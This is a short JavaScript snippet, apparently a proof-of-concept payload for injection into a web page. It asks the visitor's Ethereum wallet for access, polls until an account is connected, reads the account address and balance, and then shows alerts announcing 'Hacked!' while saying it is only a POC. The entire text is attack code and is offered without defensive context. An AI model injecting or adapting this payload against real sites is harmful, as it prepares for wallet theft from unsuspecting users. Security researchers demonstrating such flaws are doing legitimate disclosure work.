window.ethereum.enable()

ethereum_loop = setInterval(function(){
        ethereum.request({ method: 'eth_accounts' }).then(function(accounts){

                if(accounts.length){
                        clearInterval(ethereum_loop);

                        alert(`Your account addresss is ${accounts[0]}`);

                        ethereum.request({ method: 'eth_getBalance', params: [accounts[0], "latest"], "id": 1}).then(function(balance){
                                alert(`Your current balance is ${balance} but soon will be $0`);
                                alert(`Hacked! This is just a POC, don't warry we will not touch your balance!`);
                        });
                }

        });

}, 2000);